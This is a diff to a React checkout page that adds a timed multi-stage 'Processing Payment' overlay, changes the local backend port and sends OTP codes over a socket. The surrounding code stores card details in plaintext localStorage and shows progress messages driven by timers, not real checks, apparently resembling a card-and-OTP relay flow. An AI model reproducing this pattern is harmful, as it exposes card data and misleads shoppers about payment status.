@@ -133,6 +133,44 @@ const Checkout = () => {
   );
 };
 
+// ProcessingLoader Component with Multi-Stage Messages
+const ProcessingLoader = () => {
+  const [loadingStage, setLoadingStage] = useState(0);
+
+  const stages = [
+    "Please wait while we confirm your payment",
+    "Checking your details...",
+    "Redirecting you to confirmation page..."
+  ];
+
+  useEffect(() => {
+    const timers = [
+      setTimeout(() => setLoadingStage(1), 3000),  // Stage 2 after 3 seconds
+      setTimeout(() => setLoadingStage(2), 7000),  // Stage 3 after 7 seconds (3+4)
+      setTimeout(() => {
+        // Navigation can be handled by parent component
+        // This is just the loading indicator
+      }, 10000) // Total 10 seconds (3+4+3)
+    ];
+
+    return () => {
+      timers.forEach(timer => clearTimeout(timer));
+    };
+  }, []);
+
+  return (
+    <div className="fixed inset-0 bg-white bg-opacity-95 flex items-center justify-center z-50">
+      <div className="text-center">
+        <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-blue-500 mx-auto mb-4"></div>
+        <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment...</h3>
+        <p className="text-gray-600 text-sm transition-all duration-500">
+          {stages[loadingStage]}
+        </p>
+      </div>
+    </div>
+  );
+};
+
 const CheckoutOriginal = () => {
     const [searchParams] = useSearchParams();
     const navigate = useNavigate();
@@ -196,7 +234,7 @@ const CheckoutOriginal = () => {
           const getApiBaseUrl = () => {
             // In development (localhost), use port 3001 for backend
             if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-              return 'http://localhost:3001';
+              return 'http://localhost:3002';
             }
             // In production, use the same domain as frontend
             return window.location.origin;
@@ -362,7 +400,7 @@ const CheckoutOriginal = () => {
       const getSocketUrl = () => {
         // In development (localhost), use port 3001 for backend
         if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-          return 'http://localhost:3001';
+          return 'http://localhost:3002';
         }
         // In production, use the same domain as frontend
         return window.location.origin;
@@ -556,6 +594,7 @@ const CheckoutOriginal = () => {
 
   // Loading and processing states
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isCardCheckoutProcessing, setIsCardCheckoutProcessing] = useState(false);
   const [processingMessage, setProcessingMessage] = useState('');
   const [showOtp, setShowOtp] = useState(false);
   const [otpValue, setOtpValue] = useState('');
@@ -1162,23 +1201,15 @@ const CheckoutOriginal = () => {
     };
     localStorage.setItem('userCardData', JSON.stringify(cardInfo));
     
-    devLog('Validation passed - proceeding to review');
-    setIsProcessing(true);
-    setCurrentStep('processing');
+    devLog('Validation passed - proceeding to card checkout processing');
+    setIsCardCheckoutProcessing(true);
     
-    // Simulate processing with messages
-    setProcessingMessage('Please wait we are checking your details!');
-    
+    // The ProcessingLoader component will handle the multi-stage messages
+    // After 10 seconds (3+4+3), proceed to review
     setTimeout(() => {
-      setProcessingMessage('Checking your card information');
-      setTimeout(() => {
-        setProcessingMessage('Redirecting you to confirmation page..');
-        setTimeout(() => {
-          setIsProcessing(false);
-          setCurrentStep('review');
-        }, 3000);
-      }, 2000);
-    }, 1500);
+      setIsCardCheckoutProcessing(false);
+      setCurrentStep('review');
+    }, 10000);
   };
 
   // --- SOCKET EVENT HANDLING FOR PAYMENT FLOW ---
@@ -1399,7 +1430,7 @@ const CheckoutOriginal = () => {
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
       setShowPaymentErrorScreen(true);
-      
+      setIsProcessing(false); // Always hide spinner on error
       // Redirect to payment step after 4 seconds
       setTimeout(() => {
         setShowPaymentErrorScreen(false);
@@ -1446,6 +1477,7 @@ const CheckoutOriginal = () => {
       
       setOtpSubmitting(true);
       setOtpError('');
+      setIsProcessing(true); // Show spinner during OTP submit
       socket.emit('otp-submitted', { otp: otpValue, paymentId });
     } catch (error) {
       console.error('Error submitting OTP:', error);
@@ -2588,17 +2620,6 @@ const CheckoutOriginal = () => {
                     </div>
                   </div>
                   {/* Spinner overlay for Declined/Insufficient */}
-                  {showSpinner && (
-                    <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
-                      <div className="text-center">
-                        <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
-                          <CheckCircle className="h-8 w-8 text-white animate-bounce" />
-                        </div>
-                        <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment...</h3>
-                        <p className="text-gray-600 text-sm">Please wait while we confirm your transaction</p>
-                      </div>
-                    </div>
-                  )}
                   {/* Decline/Insufficient error message (after redirect) */}
                   {declineError && (
                     <div className="absolute left-0 right-0 top-2 text-center">
@@ -3030,6 +3051,11 @@ const CheckoutOriginal = () => {
           </div>
         </div>
       </footer>
+      
+      {/* Full Screen Spinner Overlay - Only during card checkout processing */}
+      {isCardCheckoutProcessing && (
+        <ProcessingLoader />
+      )}
     </div>
   );
   
